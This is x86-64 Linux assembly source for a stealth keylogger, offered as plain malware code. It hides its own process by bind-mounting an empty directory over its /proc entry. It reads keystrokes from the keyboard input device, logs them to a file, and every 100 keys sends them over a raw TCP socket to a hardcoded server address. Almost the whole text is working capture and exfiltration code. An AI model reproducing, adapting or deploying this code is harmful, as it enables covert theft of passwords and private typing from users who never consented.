section .text
  global _start

; _start is the entry point
_start:
  ; start by creating a fork and quit parent process to hide execution

  mov rax, 57
  syscall

  cmp rax, 0
  jne .exit

  ; hiding process
  call hide_process

  call find_event

  ; create/open the key.log file to store the captured keys
  ; then store file descriptor into fd
  ; and check if all works correctly, if not jmp to error
  mov rax, 2
  mov rdi, file
  mov rsi, 00001102
  mov rdx, 422
  syscall

  mov [fd], rax

  test rax, rax
  js error

  ; open /dev/input/eventX to read all keys from input
  ; then store the file descriptor to sd
  ; and check if we can open it, if not jmp to error
  mov rax, 2
  mov rdi, source
  xor rsi, rsi
  syscall

  mov [sd], rax

  test rax, rax
  js error
  
  ; begin to read keys
  jmp read_keys

.exit:
   mov rax, 60
   xor rdi, rdi
   syscall

; print an error and quit
error:
     mov rax, 1
     mov rdi, 1
     mov rsi, errorMsg
     mov rdx, errorMsgLen
     syscall

     mov rax, 60
     mov rdi, 1
     syscall

; make a loop to open every /dev/input/eventX
; check with ioctl where is located the keyboard event file
; inputs: 
;     none
;
; outputs:
;     source edited with the good path 
find_event:
  mov r8, '0'

.loop:
  sub r8, '0'
  inc r8
  add r8, '0'

  mov [source+16], r8

  mov rax, 2
  mov rdi, source
  xor rsi, rsi
  syscall
  
  mov r10, rax

  mov rax, 16
  mov rdi, r10
  mov rsi, 0x82ff4521
  mov rdx, event_codes
  syscall

  mov rax, 1
  mov rdi, 1
  mov rsi, event_codes
  mov rdx, 1 
  syscall

  mov rax, 3
  mov rdi, r10
  syscall

  test rax, rax
  js error

  cmp byte [event_codes], 0x0
  jz .loop

  ret

; find pid
; mount empty folder into /proc/pid file
hide_process:
  mov rax, 83
  mov rdi, mountPoint
  mov rsi, 422
  syscall

  mov rax, 39
  syscall

  mov rdi, pid
  mov rsi, rax  
  call uitoa

  lea rsi, [rel process]
  mov rdi, [pid+1]
  mov qword [rsi+6], rdi

  mov rax, 165
  mov rdi, mountPoint
  mov rsi, process 
  mov rdx, 0 
  mov r10, 4096
  mov r8, 0
  syscall

  mov rax, 84
  mov rdi, mountPoint
  syscall

  mov rax, 83 
  lea rdi, [process+6]  
  mov rsi, 422
  syscall

  ret

uitoa:
  mov rax, rsi

  cmp rax, 0
  jnz .uitoa_converter
  mov byte [rdi], '0' 
  inc esi
  mov rax, 0x1
  jmp .uitoa_end

.uitoa_converter:
  mov r10, 10

  xor rcx, rcx
.loop:
  xor rdx, rdx
  div r10
  inc ecx
  cmp rax, 0
  jnz .loop

  inc ecx

  mov r8, rcx
  add rdi, rcx

  mov rax, rsi
  dec ecx

.uitoa_convert:
  xor rdx, rdx
  dec rdi
  div r10
  add rdx, 48
  mov byte [rdi], dl
  loopnz .uitoa_convert

  mov rax, r8

.uitoa_end:
  ret

read_keys:
  xor rax, rax
  mov rsi, event
  mov rdx, 24
  mov rdi, [sd]
  syscall

  mov byte al, [event + 16]
  cmp ax, 0x0
  je read_keys
  cmp ax, 0x4
  je read_keys

  mov byte al, [event + 18]
  cmp al, 42
  je .check_shift

  cmp al, 54
  je .check_shift

  mov byte al , [event + 20]
  cmp al, 0x0
  je read_keys

  mov byte al , [event + 18]
  cmp byte [mode], 1
  je  .upper_key
  jne  .lower_key

 .check_shift:
    mov byte al, [event + 20]
    cmp al, 0x1
    je .press_shift
    jne  .release_shift

 .press_shift:
    mov byte [mode], 1
    jmp read_keys

 .release_shift:
    mov byte [mode], 0
    jmp read_keys

 .upper_key:
    mov byte bl, [upperKeys + eax] 
    mov byte [key], bl

    jmp write_key

 .lower_key:
    mov byte bl, [lowerKeys + eax]
    mov byte [key], bl

    jmp write_key

write_key:
  mov rax, 1
  mov rdi, [fd]
  mov rsi, key
  mov rdx, 1
  syscall

  mov al, [counter]
  mov bl, [key]
  mov byte [keys + eax],bl 

  add byte [counter], 1
  cmp byte [counter], 100
  je send_keys

  jmp read_keys 

send_keys:
  mov rax, 41
  mov rdi, 0x2 
  mov rsi, 0x1
  xor rdx, rdx
  syscall
 
  mov [socket], rax

  mov rax, 42
  mov rdi, [socket]

  mov word [addr], 0x2 
  mov bx, [port]
  mov word [addr + 2], bx 
  mov ebx, [serv]
  mov dword [addr + 4], ebx 
 
  mov rsi, addr
  mov rdx, 16
  syscall

  test rax, rax
  jnz read_keys

  mov rax, 1
  mov rdi, [socket]
  mov rsi, keys
  mov rdx, 100
  syscall

  mov rax, 3
  mov rdi, [socket]
  syscall

  mov byte [counter], 0
  jmp read_keys

section .data
  errorMsg db "must be run as root", 0xa
  errorMsgLen equ $ - errorMsg

  mountPoint db "./empty", 0
  process db "/proc/000000", 0
  filesystem db "ext4", 0

  source db "/dev/input/event0", 0

  sd dq 0

  file db "./key.log", 0
  fd dq 0

  pidStr db 8 
  pidLen equ $ - pidStr

  lowerKeys dw `??\&2\"\'(\-7\_90-=\b\tazertyuiop[]\n?qsdfghjklm,'\`?\wxcvbn,.:?*?\s?`
  upperKeys dw `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKLM,'\`?\WXCVBN?./?*?\s?`

  serv dd 0x0100007f
  port dw 0x3905

  socket dq 0

  mode db 0
  counter db 0

  const10 dq 10

section .bss
  event resb 24
  key resb 1
  keys resb 100
  addr resb 16
  pid resb 12 
  event_codes resb 64
